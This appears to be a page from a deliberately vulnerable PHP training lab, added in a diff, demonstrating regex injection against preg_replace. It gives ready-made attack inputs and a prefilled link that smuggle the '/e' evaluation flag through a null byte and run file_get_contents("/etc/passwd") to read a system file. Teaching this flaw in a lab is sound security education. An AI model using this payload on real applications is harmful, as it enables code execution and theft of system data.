@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>Regex Injection (2)</title>
+	</head>
+	<body>
+		<h1>Regex Injection (2)</h1>
+		<form action="regex2.php">
+			<table>
+				<tr><td>Pattern:    </td><td><input type="text" name="pattern"    /></td></tr>
+				<tr><td>Replacement:</td><td><input type="text" name="replacement"/></td></tr>
+				<tr><td>Subject:    </td><td><input type="text" name="subject"    /></td></tr>
+				<tr><td>            </td><td><input type="submit"                 /></td></tr>
+			</table>
+		</form>
+		<h2>How to use</h2>
+		<p>This modifies the previous example by appending the '/' characters to
+			the pattern within the script, thereby preventing the addition of
+			extra processing flags.</p>
+		<p>Enter the following parameters for the attack:</p>
+		<table>
+			<tr><td>Pattern:    </td><td>./e                            </td></tr>
+			<tr><td>Replacement:</td><td>file_get_contents("/etc/passwd")</td></tr>
+			<tr><td>Subject:    </td><td>a                               </td></tr>
+		</table>
+		<p>Then terminate the ?pattern parameter with a null character - %00.</p>
+		<p><a href="regex2.php?pattern=.%2Fe%00&replacement=file_get_contents%28%22%2Fetc%2Fpasswd%22%29&subject=a">Direct link</a>.</p>
+	</body>
+</html>
